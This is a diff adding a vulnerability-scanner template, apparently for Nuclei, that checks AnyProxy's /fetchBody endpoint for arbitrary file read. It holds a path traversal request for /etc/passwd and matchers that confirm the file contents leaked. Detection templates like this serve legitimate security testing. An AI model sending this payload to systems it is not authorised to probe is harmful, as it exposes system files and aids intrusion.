@@ -1,0 +1,30 @@
+id: anyproxy-fetchbody-arbitrary-file-read
+info:
+  name: AnyProxy fetchBody Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /fetchBody?id=1/../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "THIS IS A REQUEST FROM ANYPROXY WEB INTERFACE"
